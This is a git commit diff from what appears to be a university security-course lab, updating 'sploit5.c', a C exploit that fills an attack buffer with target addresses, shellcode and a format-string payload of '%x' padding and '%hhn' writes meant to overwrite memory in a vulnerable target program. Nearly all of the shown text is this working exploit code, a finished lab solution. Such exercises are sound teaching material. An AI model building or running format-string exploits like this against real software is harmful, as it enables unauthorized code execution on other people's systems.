9d21563817857848e10efc5f4650f896c814b676
Baiwu  Zhang <zhangba8@remote.ecf.utoronto.ca>
2018-10-05 21:11:20 -0400

    Finished part5.

--- Lab1/sploits/sploit5.c
+++ Lab1/sploits/sploit5.c
@@ -14,65 +14,34 @@ int main(void)
 	
 	args[0] = TARGET;
 	args[1] = attackBuffer;
-	//strcpy(attackBuffer, "\x68\xfe\x50\x30"); 
 	memcpy(&attackBuffer[0], "\x68\xfe\x50\x30\x00\x00\x00\x00",8); 
 	memcpy(&attackBuffer[8], "AAAAAAAA", 8);
-	memcpy(&attackBuffer[16], "\x68\xfe\x50\x30\x00\x00\x00\x00", 8);
+	memcpy(&attackBuffer[16], "\x69\xfe\x50\x30\x00\x00\x00\x00", 8);
 	memcpy(&attackBuffer[24], "AAAAAAAA", 8);
-	memcpy(&attackBuffer[32], "\x69\xfe\x50\x30\x00\x00\x00\x00", 8);
+	memcpy(&attackBuffer[32], "\x6a\xfe\x50\x30\x00\x00\x00\x00", 8);
 	memcpy(&attackBuffer[40], "AAAAAAAA", 8);
-	memcpy(&attackBuffer[48], "\x69\xfe\x50\x30\x00\x00\x00\x00", 8);
-
+	memcpy(&attackBuffer[48], "\x6b\xfe\x50\x30\x00\x00\x00\x00", 8);
 
 	memcpy(&attackBuffer[56], shellcode, 45);
 	int i;
 	
-	for (i = 0; i < 5; i ++){
+	for (i = 0; i < 4; i ++){
 		memcpy(&attackBuffer[101+2*i], "%x", 2);	
 	}
-	memcpy(&attackBuffer[111], "%077x", 5);
-	memcpy(&attackBuffer[116], "%x", 2);	
-	//memcpy(&attackBuffer[118], "%09x", 4);
-	memcpy(&attackBuffer[118], "%hn", 3);
-	memcpy(&attackBuffer[121], ".", 1);
-	memcpy(&attackBuffer[122], "%097x", 5);	
-	memcpy(&attackBuffer[127], "%hhn", 4);
-	//memcpy(&attackBuffer[127], "%09x", 4);
-	//memcpy(&attackBuffer[131], "%54x.", 4);	
-	//memcpy(&attackBuffer[135], "%hhn.", 5);
-	for (i = 0; i < 10; i ++){
-		memcpy(&attackBuffer[131+i], ".", 1);	
-	}
-	/*for (i = 0; i < 7; i ++){
-		memcpy(&attackBuffer[101+5*i], "%x...", 5);	
-	}*/
-	//strcat(attackBuffer, "%hhn.");
-		
-        for (i = 0; i < 14; i ++){
-		memcpy(&attackBuffer[141+5*i], ".....", 5);	
-	}
-        for (i = 0; i < 43; i ++){
-		memcpy(&attackBuffer[211+i], " ", 1);	
+	memcpy(&attackBuffer[109], "%086x", 5);
+	memcpy(&attackBuffer[114], "%hhn", 4);
+	memcpy(&attackBuffer[118], "%097x", 5);	
+	memcpy(&attackBuffer[123], "%hhn", 4);
+	memcpy(&attackBuffer[127], "%087x", 5);	
+	memcpy(&attackBuffer[132], "%hhn", 4);	
+	memcpy(&attackBuffer[136], "%0224x", 6);	
+	memcpy(&attackBuffer[142], "%hhn", 4);
+
+        for (i = 0; i < 255-146; i ++){
+		memcpy(&attackBuffer[146+i], " ", 1);	
 	}
 	memcpy(&attackBuffer[255], "\x00", 1);
-/*	for (i = 0; i < 21; i ++){
-		strcat(attackBuffer, "........");	
-	}
-	
-	
-	strcat(attackBuffer, "....");	
-*/
-	printf("%d\n", strlen(attackBuffer));
-	printf("length of 08x: %d\n", strlen("%08x"));
-	printf("length of 04x: %d\n", strlen("%04x"));
-	printf("length of 050x: %d\n", strlen("%050x"));
-	printf("length of x: %d\n", strlen("%x"));
-	printf("length of 01x: %d\n", strlen("%01x"));
-	printf("length of hhn: %d\n", strlen("%hhn"));
-	printf("length of hn: %d\n", strlen("%hn"));
-	printf("\n");
-	printf("\n");
-	printf("\n");
+
 	args[2] = NULL;
 
 	env[0] = &attackBuffer[5];
